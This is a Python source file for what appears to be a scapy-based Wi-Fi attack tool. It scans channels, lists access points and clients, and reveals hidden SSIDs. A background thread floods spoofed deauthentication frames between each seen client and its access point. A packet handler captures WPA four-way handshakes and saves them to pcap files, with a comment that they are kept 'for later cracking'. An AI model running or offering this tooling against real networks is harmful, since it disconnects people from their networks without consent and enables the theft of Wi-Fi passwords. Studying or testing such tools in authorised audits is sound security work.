#!/usr/bin/env python
# -*- coding: utf-8 -*-

from logging import getLogger, ERROR

from random import choice
from threading import Thread
from scapy.all import *
from scapy.contrib.wpa_eapol import WPA_key

import devices
import globalsx

import packets
import clients
import networks

getLogger("scapy.runtime").setLevel(ERROR)

conf.iface = "wlan1mon"         # NEED TO IMPLEMENT FIX FOR DEAUTH ISSUE


class Sniffer:

    def __init__(
        self,
        interface,
        channels,
        target,
        mac,
        unassociated,
        diagnose,
        open_network,
        Clients_,
        kill_time,
        deauth=None
    ):

        self.mChannel = devices.get_channel(interface)
        self.mUnassociated = unassociated
        self.mInterface = interface
        self.mDiagnose = diagnose
        self.mChannels = channels
        self.mClients = Clients_
        self.mTarget = target
        self.mOpen = open_network
        self.mMAC = mac

        print(channels)

        globalsx.gDEAUTH = deauth

        self.mTime = kill_time

        self.mPackets = 0

        self.mHidden = []

        self.mAPs = {}
        self.mCls = {}
        self.mUCls = {}

        if len(self.mChannels) == 1:
            self.mHop = False
            self.mChannel = channels[0]
            devices.set_channel(devices.get_device(interface), channels[0])

        else:
            self.mHop = True
            hop_thread = Thread(target=self.hopper)
            hop_thread.daemon = True
            hop_thread.start()

        if globalsx.gDEAUTH:
            deauth_thread = Thread(target=self.deauther)
            deauth_thread.daemon = True
            deauth_thread.start()

        if not self.mDiagnose:
            printer_thread = Thread(target=self.printer)
            printer_thread.daemon = True
            printer_thread.start()

        return

    def deauther(self):
        while globalsx.gALIVE:

            deauth_packets = []

            for i in globalsx.gDEAUTHS[self.mChannel]:

                dpkt1 = Dot11(
                    addr1=i[0],
                    addr2=i[1],
                    addr3=i[1]) / Dot11Deauth()

                dpkt2 = Dot11(
                    addr1=i[1],
                    addr2=i[0],
                    addr3=i[0]) / Dot11Deauth()

                deauth_packets.append(dpkt1)
                deauth_packets.append(dpkt2)

            for deauths in deauth_packets:
                send(deauths, inter=float(0.001), count=int(1), verbose=False)

            time.sleep(2)

            if not globalsx.gALIVE:
                return

        return 0

    def hopper(self):

        interface = devices.get_device(self.mInterface)

        # Repeat until program exits.
        while globalsx.gALIVE:

            try:

                if not globalsx.gFILTERCHANNEL:

                    channel = choice(self.mChannels)
                    devices.set_channel(interface, channel)
                    self.mChannel = channel

                # If target found.
                else:
                    devices.set_channel(interface,  globalsx.gFILTERCHANNEL)
                    self.mChannel = globalsx.gFILTERCHANNEL

                    break

                if self.mDiagnose:
                    print("[CH]:   Channel Set to: {0}".format(self.mChannel))

                time.sleep(1.75)

            except AttributeError:
                print("Error on interpreter shutdown. Disregard.")
                sys.exit(0)

        # Exit hopper.
        return

    def printer(self):
        # Loop until program exit.
        while globalsx.gALIVE:

            wifis = list(map(self.get_access_points, self.mAPs))
            wifis.sort(key=lambda x: (x[7]))

            # Get Clients
            if not self.mClients:
                clients = list(map(self.get_Clients, self.mCls))

                if self.mUnassociated:
                    clients += list(map(self.get_un_Clients, self.mUCls))

                clients.sort(key=lambda x: (x[4], x[1]))

            ptime = globalsx.get_elapsed_time()

            # Clear the console.
            os.system("clear")

            # Write top line to terminal.
            sys.stdout.write(
                "[{2}] T: [{0}] C: [{1}]\n\n".format(
                    ptime,
                    self.mChannel,
                    self.mPackets,
                )
            )

            # Print first header line in red.
            sys.stdout.write(
                "{0}{1}{2}{3}{4}{5}{6}{7}\n".format(
                    "Mac Addr".ljust(19, " "),
                    "Enc".ljust(10, " "),
                    "Cipher".ljust(12, " "),
                    "Ch".ljust(5, " "),
                    "Vendor".ljust(10, " "),
                    "Sig".ljust(5, " "),
                    "Bcns".ljust(8, " "),
                    "SSID"
                )
            )

            for item in wifis:
                # Print access points

                if self.mOpen:
                    if"OPEN" not in item[1]:
                        sys.stdout.write(
                            " {0}{1}{2}{3:<5}{4}{5:<5}{6:<8}{7}\n".format(
                                item[0].ljust(19, " "),
                                item[1].ljust(10, " "),
                                item[2].ljust(11, " "),
                                item[3],
                                item[4].ljust(10, " "),
                                item[5],
                                item[6],
                                item[7].encode('utf-8')
                            )
                        )

                else:
                    sys.stdout.write(
                        " {0}{1}{2}{3:<5}{4}{5:<5}{6:<8}{7}\n".format(
                            item[0].ljust(19, " "),
                            item[1].ljust(10, " "),
                            item[2].ljust(11, " "),
                            item[3],
                            item[4].ljust(10, " "),
                            item[5],
                            item[6],
                            item[7].encode('utf-8')
                        )
                    )

            if not self.mClients:
                # Print second header in red.
                sys.stdout.write(
                    "\n{0}{1}{2}{3}{4}\n".format(
                        "Mac".ljust(19, " "),
                        "AP Mac".ljust(19, " "),
                        "Noise".ljust(7, " "),
                        "Sig".ljust(5, " "),
                        "AP SSID"
                    )
                )

                for item in clients:
                    # Print Clients.
                    sys.stdout.write(
                        " {0}{1}{2:<7}{3:<5}{4}\n".format(
                            item[0].ljust(19, " "),
                            item[1].ljust(19, " "),
                            item[2],
                            item[3],
                            item[4].encode('utf-8')
                        )
                    )

            time.sleep(1.75)

        # If exits.
        return

    # C-extension map method for retrieving access points
    def get_access_points(self, ap):
        return [
            self.mAPs[ap].mMAC,
            self.mAPs[ap].mEnc,
            self.mAPs[ap].mCipher,
            self.mAPs[ap].mCh,
            self.mAPs[ap].mVen,
            self.mAPs[ap].mSig,
            self.mAPs[ap].mBeacons,
            self.mAPs[ap].mSSID
        ]

    # C-extension map method for retrieving Clients
    def get_Clients(self, cl):
        return [
            self.mCls[cl].mMAC,
            self.mCls[cl].mBSSID,
            self.mCls[cl].mNoise,
            self.mCls[cl].mSig,
            self.mCls[cl].mESSID
        ]

    # C-extension map method for retrieving unassociated Clients
    def get_un_Clients(self, cl):
        return [
            self.mUCls[cl].mMAC,               # Mac
            "-",                               # NULL
            self.mUCls[cl].mNoise,             # Noise
            self.mUCls[cl].mSig,               # Signal
            "-"                                # NULL
        ]

    def run(self):

        # Check if a target is set.
        if self.mTarget:

            sniff(
                iface=self.mInterface,
                filter="ether host " + self.mTarget.lower(),
                prn=self.sniff_packets,
                store=0
            )

        # If no target is set.
        else:

            sniff(
                iface=self.mInterface,
                prn=self.sniff_packets,
                store=0
            )

        return

    # Method for parsing packets.
    def sniff_packets(self, packet_object):

        self.mPackets += 1

        # try:
        if packet_object.type == 0:

            if packet_object.subtype == 4:
                self.handler_probe_request(packet_object)

            elif packet_object.subtype == 5 and packet_object.addr3 in self.mHidden:
                self.handler_probe_response(packet_object)

            elif packet_object.subtype == 8 and devices.check_valid_mac(packet_object.addr3):
                self.handler_beacon(packet_object)

            elif packet_object.subtype == 12:
                self.handler_deauth(packet_object)

        elif packet_object.type == 1:
            self.handler_ctrl(packet_object)

        elif packet_object.type == 2:
            self.handler_data(packet_object)

        # except AttributeError as e:
        #     print("Error raised most likely during shutdown.", e)

        return

    # Handler for probe requests
    def handler_probe_request(self, packet):

        if self.mUCls.get(packet.addr2):
            self.mUCls[packet.addr2].mSig = (packets.get_rssi(packet.notdecoded))
            self.mUCls[packet.addr2] + 1

        # If Client not seen.
        elif devices.check_valid_mac(packet.addr2):

            if self.mCls.get(packet.addr2):
                del self.mCls[packet.addr2]

            self.mUCls[packet.addr2] = clients.Client(packet.addr2, "", packets.get_rssi(packet.notdecoded), "")

            if self.mDiagnose:
                print("[PR-1]: Unassociated clients.Client: {0}".format(packet.addr2))

        return

    # Handler probe responses
    def handler_probe_response(self, packet):

        # update ssid info
        if self.mAPs.get(packet.addr3):
            self.mAPs[packet.addr3].mSSID = packets.get_ssid(packet.info)

            self.mHidden.remove(packet.addr3)

            # Append this packet as beacon packet for later cracking.
            self.mAPs[packet.addr3].packets.append(packet)

            if self.mDiagnose:
                print("[P-1]:  Hidden Network Uncovered: " + packets.get_ssid(packet.info))

        return

    # Handler for beacons
    def handler_beacon(self, packet):

        # If AP already seen.
        if self.mAPs.get(packet.addr2):

            self.mAPs[packet.addr2].mSig = (packets.get_rssi(packet.notdecoded))
            self.mAPs[packet.addr2] + 1

        # If beacon is a new AP.
        else:

            # Get name of Access Point.
            name = packets.get_ssid(packet.info)

            if "< len: " in name:
                self.mHidden.append(packet.addr3)

            channel = packets.get_channel(packet)

            if self.mHop and int(channel) != int(self.mChannel):
                return

            # sec is a set() cipher is a string
            sec, cipher = packets.get_security(packet)

            # Test if oui in mac address

            oui = packets.get_vendor(packet.addr3)

            # Create AP object.
            self.mAPs[packet.addr2] = networks.AccessPoint(
                name,
                ":".join(sec),
                cipher,
                channel,
                packet.addr3,
                unicode(oui),
                packets.get_rssi(packet.notdecoded),
                packet
            )

            # If target found set filter and cancel hopper thread.
            if packet.addr3 == self.mTarget:
                globalsx.gFILTERCHANNEL = int(channel)

            if self.mDiagnose:
                print("[B-1]:  New Network: {0}".format(name.encode('utf-8')))

        return

    def handler_deauth(self, packet):

        # check addresses
        if self.mAPs.get(packet.addr1) and not devices.check_valid_mac(packet.addr2):

            # Deauth is targeting broadcast > Do nothing but flag this.
            if self.mDiagnose:
                print("[D-1]:  Deauth to broadcast at: {0}".format(packet.addr1))

        elif self.mAPs.get(packet.addr2) and not devices.check_valid_mac(packet.addr1):

            # Deauth is targeting broadcast > Do nothing but flag this.
            if self.mDiagnose:
                print("[D-2]:  Deauth to broadcast at: {0}".format(packet.addr2))

        elif self.mCls.get(packet.addr1):
            del self.mCls[packet.addr1]

            self.mUCls[packet.addr1] = clients.Client(packet.addr1, "", packets.get_rssi(packet.notdecoded), "")

            if self.mDiagnose:
                print("[D-3]:  Deauth to target at: {0}".format(packet.addr1))

        elif self.mCls.get(packet.addr2):
            del self.mCls[packet.addr2]

            self.mUCls[packet.addr2] = clients.Client(packet.addr2, "", packets.get_rssi(packet.notdecoded), "")

            if self.mDiagnose:
                print("[D-4]:  Deauth to target at: {0}".format(packet.addr2))

        else:
            if self.mDiagnose:
                print("[D-99]: Deauth detected.")

        return

    # Handler for ctrl packets
    def handler_ctrl(self, packet):

        # If AP has been seen
        if packet.addr1 in self.mAPs:
            self.mAPs[packet.addr1].mSig = (packets.get_rssi(packet.notdecoded))

        return

    # Handler for data packets.
    def handler_data(self, packet):

        if packet.addr1 == packet.addr2:
            return  # <!-- What the fuck?

        # if ap has been seen
        if self.mAPs.get(packet.addr1):

            # if clients.Client has been seen
            if self.mCls.get(packet.addr2):

                # if clients.Client changed access points
                if self.mCls[packet.addr2].mBSSID != packet.addr1:

                    # Update access point
                    self.mCls[packet.addr2].mSSID = (packet.addr1)

                    if self.mDiagnose:
                        print("[Da-1]: clients.Client: {0} probing for: {1}".format(packet.addr2, packet.addr1))

                # Update signal and noise
                self.mCls[packet.addr2] + 1
                self.mCls[packet.addr2].mSig = (packets.get_rssi(packet.notdecoded))

            # If clients.Client was previously unassociated
            elif self.mUCls.get(packet.addr2):

                # Create a new clients.Client object
                self.mCls[packet.addr2] = clients.Client(packet.addr2, packet.addr1, packets.get_rssi(packet.notdecoded), self.mAPs[packet.addr1].mSSID)

                if globalsx.gDEAUTH:
                    globalsx.gDEAUTHS[self.mChannel].append([packet.addr2, packet.addr1])

                # Destroy previous clients.Client object
                del self.mUCls[packet.addr2]

                if self.mDiagnose:
                    print("[Da-2]: clients.Client has associated: {0}".format(packet.addr2))

            # if clients.Client previously unseen
            elif devices.check_valid_mac(packet.addr2):

                # Create new clients.Client object
                self.mCls[packet.addr2] = clients.Client(packet.addr2, packet.addr1, packets.get_rssi(packet.notdecoded), self.mAPs[packet.addr1].mSSID);

                if globalsx.gDEAUTH:
                    globalsx.gDEAUTHS[self.mChannel].append([packet.addr2, packet.addr1])

                if self.mDiagnose:
                    print("[Da-3]: New clients.Client: {0}, {1}".format(packet.addr2, packet.addr1))

        # If access point seen
        elif self.mAPs.get(packet.addr2):

            # If clients.Client seen.
            if self.mCls.get(packet.addr1):

                # if clients.Client changed access points
                if self.mCls[packet.addr1].mBSSID != packet.addr2:

                    self.mCls[packet.addr1].mSSID = (packet.addr2)

                    if self.mDiagnose:
                        print("[Da-4]: clients.Client: {0} probing for: {1}".format(packet.addr2, packet.addr1))

                # Update noise and signal
                self.mCls[packet.addr1] + 1;
                self.mCls[packet.addr1].mSig = (packets.get_rssi(packet.notdecoded))

            # if clients.Client was previously unassociated
            elif self.mUCls.get(packet.addr1):

                # Create new clients.Client and delete old object
                self.mCls[packet.addr1] = clients.Client(packet.addr1, packet.addr2, packets.get_rssi(packet.notdecoded), self.mAPs[packet.addr2].mSSID)

                if globalsx.gDEAUTH:
                    globalsx.gDEAUTHS[self.mChannel].append([packet.addr1, packet.addr2])

                del self.mUCls[packet.addr1]

                if self.mDiagnose:
                    print("[Da-5]: clients.Client has associated: {0}".format(packet.addr1))

            # Check if mac is valid before creating new object.
            elif devices.check_valid_mac(packet.addr1):

                # Create new clients.Client object
                self.mCls[packet.addr1] = clients.Client(packet.addr1, packet.addr2, packets.get_rssi(packet.notdecoded), self.mAPs[packet.addr2].mSSID)

                if globalsx.gDEAUTH:
                    globalsx.gDEAUTHS[self.mChannel].append([packet.addr1, packet.addr2])

                if self.mDiagnose:
                    print("[Da-6]: New clients.Client: {0}".format(packet.addr1))

        # Check if packet is part of a wpa handshake
        if packet.haslayer(WPA_key):

            # If mac has not been seen.
            if packet.addr3 not in self.mAPs:
                return

            # If mac has been seen
            else:

                # Get wpa layer
                layer = packet.getlayer(WPA_key)

                if (packet.FCfield & 1):
                    #  From DS = 0, To DS = 1
                    STA = packet.addr2

                elif (packet.FCfield & 2):
                    #  From DS = 1, To DS = 0
                    STA = packet.addr1

                # This info may be unnecessary.
                key_info = layer.key_info
                wpa_key_length = layer.wpa_key_length
                replay_counter = layer.replay_counter

                WPA_KEY_INFO_INSTALL = 64
                WPA_KEY_INFO_ACK = 128
                WPA_KEY_INFO_MIC = 256

                # check for frame 2
                if (key_info & WPA_KEY_INFO_MIC) and ((key_info & WPA_KEY_INFO_ACK == 0) and (key_info & WPA_KEY_INFO_INSTALL == 0) and (wpa_key_length > 0)):

                    if self.mDiagnose:
                        print("[K-1]:  {0}".format(packet.addr3))

                    self.mAPs[packet.addr3].frame2 = 1
                    self.mAPs[packet.addr3].packets.append(packet[0])

                # check for frame 3
                elif (key_info & WPA_KEY_INFO_MIC) and ((key_info & WPA_KEY_INFO_ACK) and (key_info & WPA_KEY_INFO_INSTALL)):

                    if self.mDiagnose:
                        print("[K-2]:  {0}".format(packet.addr3))

                    self.mAPs[packet.addr3].frame3 = 1
                    self.mAPs[packet.addr3].replay_counter = replay_counter
                    self.mAPs[packet.addr3].packets.append(packet[0])

                # check for frame 4
                elif (key_info & WPA_KEY_INFO_MIC) and ((key_info & WPA_KEY_INFO_ACK == 0) and (key_info & WPA_KEY_INFO_INSTALL == 0) and self.mAPs[packet.addr3].replay_counter == replay_counter):

                    if self.mDiagnose:
                        print("[K-3]:  {0}".format(packet.addr3))

                    self.mAPs[packet.addr3].frame4 = 1
                    self.mAPs[packet.addr3].packets.append(packet[0])

                if (self.mAPs[packet.addr3].frame2 and self.mAPs[packet.addr3].frame3 and self.mAPs[packet.addr3].frame4):

                    if self.mDiagnose:
                        print("[Key]:  {0}".format(packet.addr3))

                    folder_path = ("pcaps/")
                    filename = ("{0}_{1}.pcap").format(self.mAPs[packet.addr3].mSSID.encode('utf-8'), packet.addr3[-5:].replace(":", ""))

                    wrpcap(folder_path+filename, self.mAPs[packet.addr3].packets)
                    self.mAPs[packet.addr3].mCapped = True
                    # except:
                    #    print("Write failed.")
        return
